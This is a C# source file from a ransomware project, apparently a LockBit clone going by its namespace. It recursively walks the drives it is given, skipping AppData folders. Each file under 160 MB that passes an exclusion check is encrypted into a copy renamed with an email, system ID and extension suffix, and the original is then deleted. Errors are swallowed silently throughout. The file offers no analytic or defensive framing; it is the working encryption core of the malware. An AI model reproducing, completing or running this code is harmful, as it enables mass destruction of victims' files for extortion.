using System;
using System.IO;
using System.Threading;

#nullable disable
namespace LockBIT
{
    internal static class SE
    {
        private static readonly string Key = Program.Key;
        private static readonly string[] disk = Program.disk;

        private static string[] Folder { get; set; }

        private static string[] Files { get; set; }

        public static void RunEncrypt(string label)
        {
            new Thread((ThreadStart)(() => SE.ThreadFolders(label))).Start();
        }

        internal static void ThreadFolders(string lable)
        {
            SE.SearchFile(lable);
            SE.SearchFolder(lable);
        }

        internal static void SearchFolder(string name)
        {
            try
            {
                SE.Folder = Directory.GetDirectories(name, "*", SearchOption.TopDirectoryOnly);
            }
            catch (UnauthorizedAccessException ex)
            {
                return;
            }
            catch (DirectoryNotFoundException ex)
            {
                return;
            }
            catch (IOException ex)
            {
                return;
            }
            catch (Exception ex)
            {
                return;
            }
            foreach (string name1 in SE.Folder)
            {
                if (!name1.Contains("\\AppData\\"))
                {
                    SE.SearchFile(name1);
                    SE.SearchFolder(name1);
                }
            }
        }

        internal static void SearchFile(string name)
        {
            try
            {
                SE.Files = Directory.GetFiles(name, "*");
            }
            catch (Exception ex)
            {
            }
            foreach (string file in SE.Files)
            {
                try
                {
                    long length = new FileInfo(file).Length;
                    if (!Program.ShouldExclude(file, length))
                    {
                        if (length < 160000000L)
                            SE.Encrypt(file);
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }

        internal static void Encrypt(string name)
        {
            try
            {
                File.SetAttributes(name, FileAttributes.Normal);

                string outputFile = $"{name}.{Program.email1}.{Program.systemID}.{Program.Extention}";

                // AES-CTR 방식으로 암호화
                Encryption.EncryptFile(name, outputFile);

                File.Delete(name);
            }
            catch (Exception ex)
            {
            }
        }
    }
}
